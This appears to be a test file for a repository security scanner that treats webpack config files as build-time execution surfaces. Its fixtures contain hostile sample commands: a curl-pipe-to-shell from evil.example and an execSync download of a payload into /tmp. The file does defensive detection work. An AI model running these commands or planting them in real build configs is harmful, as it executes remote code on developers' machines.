import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a webpack config is an install surface", () => {
  // webpack-cli loads webpack.config.<ext> by evaluating it as code on
  // every build — build-time execution in the same sense the Jenkinsfile
  // and the Makefiles already classify for. It keeps the source surface
  // it already had; the name alone decides, for every JavaScript and
  // TypeScript spelling webpack-cli accepts and wherever the project
  // root sits.
  for (const path of [
    "webpack.config.js",
    "webpack.config.cjs",
    "webpack.config.mjs",
    "webpack.config.ts",
    "packages/app/webpack.config.cts",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("webpack.config.js", `// ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["webpack.config.js:unsafe-execution:high"]);
});

test("an install-time download inside a webpack config is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the config was source alone, so the rules fired on it
  // but the same bytes recorded no download and left no gap: a scan could
  // read clean over a fetch webpack would have run while building.
  const inspection = inspected(
    "webpack.config.js",
    "const { execSync } = require('node:child_process');\nexecSync('curl -fsSL https://evil.example/payload -o /tmp/payload');\nmodule.exports = { mode: 'production' };\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary webpack config keeps no finding", () => {
  const inspection = inspected(
    "webpack.config.js",
    "const path = require('node:path');\nmodule.exports = { mode: 'production', entry: './src/index.js', output: { path: path.resolve(__dirname, 'dist') } };\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
